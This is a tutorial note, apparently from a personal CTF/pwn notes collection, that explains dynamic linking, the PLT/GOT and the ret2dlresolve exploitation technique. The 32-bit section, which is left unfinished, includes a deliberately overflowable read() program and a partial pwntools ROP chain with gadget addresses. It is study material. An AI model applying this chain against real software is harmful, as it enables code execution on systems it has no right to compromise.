# Ret2dlResolve

Ret2dlresolve is a technique used in binary exploitation to exploit vulnerable programs by manipulating dynamic linker and resolver functions, allowing an attacker to execute arbitrary code or gain control of a compromised system. 

It allow attackers to resolve and call functions from shared libraries even in the presence of stack canaries or non-executable memory protections.

:warning: This bypass is not effectiv if RELRO is fully enable because that prevents modifications to the Global Offset Table (GOT) and the Procedure Linkage Table (PLT), making it difficult to manipulate function pointers.

### Table of Content

- [Context and Theory](#context-and-theory)
	- [Compile a Program without libraries](#compiled-a-program-without-libraries)
	- [Compile a Program with libraries](#compile-a-program-with-libraries)
		- [Statically link](#static-libraries)
		- [Dynamically link](#dynamic-linking)
      - [Plt and Got](#plt-and-got-sections)
  - [How the exploit Work](#how-the-exploit-work)
- [Exploit](#exploit)
  - [32 bit](#32-bit)
    - [no RELRO](#no-relro)
    - [Partial RELRO](#partial-relro)
  - [64 bit]()
    - [Partial RELRO]()
- [Documentation](#documentation)


## Context and theory

### Compiled a Program without libraries

Lets say we have two file main.c and foo.c.

![function](/pwn/img/function.png)

**Symbol** resolution is defined as find a single definition for each symbol and **Relocation** is defined as update each reference to a symbol with the runtime address of the definition.

To create an executable it merge the sections from mutiple object files together and update symbol reference.

![relocation](/pwn/img/relocation.png)

```bash
$> gcc -c main.c foo.c
```

First on main.o, f() is defined on symbol table but call undefined and the program will fix it: 

```bash
$> objdump main.o -tTrR

SYMBOL TABLE:
0000000000000000 l    df *ABS*	0000000000000000 main.c
0000000000000000 l    d  .text	0000000000000000 .text
0000000000000000 g     F .text	0000000000000014 main
0000000000000000         *UND*	0000000000000000 f
```

We can print the things that compiler need to do to create the executable. This things are stored in the **.rela** section.

```bash
$> readelf -r main.o 

Relocation section '.rela.text' at offset 0x160 contains 1 entry:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000000009  000400000004 R_X86_64_PLT32    0000000000000000 f - 4
```

As we can see here, the f() symbol need to be fix.

```bash
# Another way to see the call to f() undefined
$> objdump main.o -dx

0000000000000000 <main>:
   0:	f3 0f 1e fa          	endbr64 
   4:	55                   	push   %rbp
   5:	48 89 e5             	mov    %rsp,%rbp
   8:	e8 00 00 00 00       	call   d <main+0xd>
			9: R_X86_64_PLT32	f-0x4
   d:	b8 00 00 00 00       	mov    $0x0,%eax
  12:	5d                   	pop    %rbp
  13:	c3                   	ret    
```

Address of f() isn't defined `e8 00 00 00 00`.

Now lets print the a.out:

```bash
# call is fix now !
$> objdump a.out -dx

0000000000001129 <main>:
    1129:	f3 0f 1e fa          	endbr64 
    112d:	55                   	push   %rbp
    112e:	48 89 e5             	mov    %rsp,%rbp
    1131:	e8 07 00 00 00       	call   113d <f>
    1136:	b8 00 00 00 00       	mov    $0x0,%eax
    113b:	5d                   	pop    %rbp
    113c:	c3                   	ret    
```

### Compile a Program with libraries

In addition with every thing we saw earlier, libraries are often used in programs. This libraries can be add statically or dynamically.

- *build time* : gcc main.c
- *load / run time* : ./a.out

### Static Libraries

Static libraries are link at *build time* (opposit of at *run time* (during the execution)).

```c
#include <stdio.h>

int main(void) {
    printf("test");
}
```

```bash
$> gcc -c main.c -static
$> readelf -r main.o

Relocation section '.rela.text' at offset 0x198 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
00000000000b  000300000002 R_X86_64_PC32     0000000000000000 .rodata - 4
000000000018  000500000004 R_X86_64_PLT32    0000000000000000 printf - 4
```

As we can see, `.rodata` and `printf` need to be resolve.

```bash
$> gcc main.o -static
$> objdump a.out -dx

0000000000401745 <main>:
  401745:       f3 0f 1e fa             endbr64 
  401749:       55                      push   %rbp
  40174a:       48 89 e5                mov    %rsp,%rbp
  40174d:       48 8d 05 b0 68 09 00    lea    0x968b0(%rip),%rax        # 498004 <_IO_stdin_used+0x4>
  401754:       48 89 c7                mov    %rax,%rdi
  401757:       b8 00 00 00 00          mov    $0x0,%eax
  40175c:       e8 2f 9e 00 00          call   40b590 <_IO_printf>
  401761:       b8 00 00 00 00          mov    $0x0,%eax
  401766:       5d                      pop    %rbp
  401767:       c3                      ret    
  401768:       0f 1f 84 00 00 00 00    nopl   0x0(%rax,%rax,1)
  40176f:       00
```

Compiler add printf at the .text section.

The problem is the size of the executable. Static link load every function used in the program inside the executable increasing the size of it.

```bash
$> gcc main.c -static | ls -lh
total 892K
-rwxrwxr-x 1 gottie gottie 880K sept. 11 12:18 a.out
$> gcc main.c | ls -lh
total 28K
-rwxrwxr-x 1 gottie gottie  16K sept. 11 12:19 a.out
```

880k against 16k for the dynamic linking.

### Dynamic linking

libraries are load at run time:

![shared-libraries](/pwn/img/shared.png)

**Shared libraries**: 

- are an executables that can be linked with the library at load time
- create a .interp section with the location of the dynamic linker

**When the program is compile :**

- Build time(`gcc main.c`)
  - libraries relocations and symbols tables info are load into the executable
- Load time(`./a.out`)
  - loader checks for .interp section
  - loader runs the dynamic linker
  - dynamic linker:
    - relocates the text and data sections of the shared libraries into memory
    - relocates references to any symbols referenced in shared libraries

![schema of dl](/pwn/img/creation-of-dl.png)

Lets dive into how it work presicely:

### Plt and Got sections:

PLT (procedure linkage Table) contain code to help with runtime linkage.

GOT (global offset table) contain informations on variables and functions.

For every PLT entry (plt.sec) you have a corresponding GOT entry.

Every time you call an extern function, the programm call the plt.sec of the corresponding function:


```py
Disassembly of section .plt.sec:

0000000000401050 <printf@plt>:
  401050 <+0>:    jmpq    *0x200c22(%rip)   # 0x601018
  401056 <+6>:    pushq   $0x0
  40105b <+11>:	  jmpq    0x4003e0
```

First call to printf:

- jmpq to 0x601018 point to the entry of printf in the GOT.
- but if we `print/x *(void**)0x601018` it print `0x401056`
- It mean The entry of GOT point back to the next instruction on the PLT.
- then push relog_arg/rel_offset to the stack
- Finaly call PLT[0] wich contain a pointer to the dinamic linker.
- The dl will resolve 0x601018 pointing now to printf().
- Then it call printf().

Second Call of printf:

- jmpq to 0x601018 point to the entry of printf in the GOT.
- Now 0x601018 print to prinf function so it is call throught the GOT.

### How The exploit Work

Elf file uses to relocation dynamically linked functions. It is the core of ret2dlresolve attack: _dl_runtime_resolve(link_map, reloc_offset).

Definition:

- .dynsym: (dynamic symbol) it occur at build time, when librairie symbol are load into our executable.
- .dynstr: (dynamic string) store string associated with .dynsym for example their name.
- .rel.plt (relocation.plt) store information of none resolute symb.

For example in our main.c

```bash
$> readelf -r a.out
Relocation section '.rela.plt' at offset 0x548 contains 1 entrie:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
```

:warning: When the dynamic linker resolve the functon's address it overwrite the GOT entry and the .rel.plt.

**3** ways:

#### Direct control over the content of the .rel.plt items

- overwrite the .rel.plt with the address of system(), when the dl is call, he know the resolution as been done and can call it.

#### Indirecty control the content of the .rel.plt items

- overwrite a function name inside the .dynstr to write the system() function.
- call the dynamic linker:
  - it resolve the address of the function by looking at it name in the .dynstr and call it

#### Forge link-map

The idea is to crate a fake link_map struct use by the dl for resolve symbols. If we can control it, we can influence dl to resolve the function that we want.

## Exploit

- [RELRO](/pwn/security-of-binaries.md#relro)

### 32 bit

#### No RELRO

#### Partial RELRO

Vuln code with control eip at 28:

```c
int main(void)
{
  char buffer[24];
  read(0, buffer, 0x64);
  return ;
}
```

Follow the [payload](/pwn/payload/payload_ret2dlresolve_32bit_partialRELRO.py).

- First it get every addresses sections:

```py
# code
addr_dynsym     = elf.get_section_by_name('.dynsym').header['sh_addr']
addr_dynstr     = elf.get_section_by_name('.dynstr').header['sh_addr']
addr_relplt     = elf.get_section_by_name('.rel.plt').header['sh_addr']
addr_plt        = elf.get_section_by_name('.plt').header['sh_addr']
addr_bss        = elf.get_section_by_name('.bss').header['sh_addr']
addr_plt_read   = elf.plt['read']
addr_got_read   = elf.got['read']
```

*You can print every section of your programm on gdb-gef with `info file`*

```py
#output
[*] Section Headers
[*] .dynsym  : 0x80481cc
[*] .dynstr  : 0x804821c
[*] .rel.plt : 0x8048298
[*] .plt     : 0x80482d0
[*] .bss     : 0x804a020
[*] read@plt : 0x80482e0
[*] read@got : 0x804a00c
```

- Load [some gadget](/tools/RopGadget.md) (addapt it to your code)

```py
# Gadget
addr_pop3 = 0x080484b9 # pop esi, pop edi, pop ebp, ret
addr_pop_ebp = 0x080484bb # pop ebp, ret
addr_leave_ret = 0x08048398 # leave, ret
```

- control eip to call a `read(0, addr_bss+0x300, 100);` and write our fake struct inside the bss section.

Why in bss ? bss is a section where data unitialized are stored. There is a anmout of place fill with zero in a read-write section. What is better ? 

```py
stack_size = 0x300
base_stage = addr_bss + stack_size
 
#read(0,base_stage,100)
#jmp base_stage
buf1 = b'A'* (28)
buf1 += p32(addr_plt_read)
buf1 += p32(addr_pop3)
buf1 += p32(0)
buf1 += p32(base_stage)
buf1 += p32(100)
buf1 += p32(addr_pop_ebp)
buf1 += p32(base_stage)
buf1 += p32(addr_leave_ret)
```

Is stack size use as a padding ? maybe ? 

- So the buffer is fill with the offset, and we overwrite eip to read@plt (read function).
- return address push on the stack
- read argument push on the stack `read(0,base_stage,100) // read(stdin, buffer, size_read)`
- 

### Documentation

- [Amazing videos of Chris Kanich](https://www.youtube.com/watch?v=Ss2e6JauS0Y)
- [ret2 tuto: binary exploitation](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation)
- [ret2 tuto:tistory](https://wyv3rn.tistory.com/225#----%--return%--to%--dl-resolve)

---

[**:arrow_right_hook: Back PWN**](/pwn/pwn.md)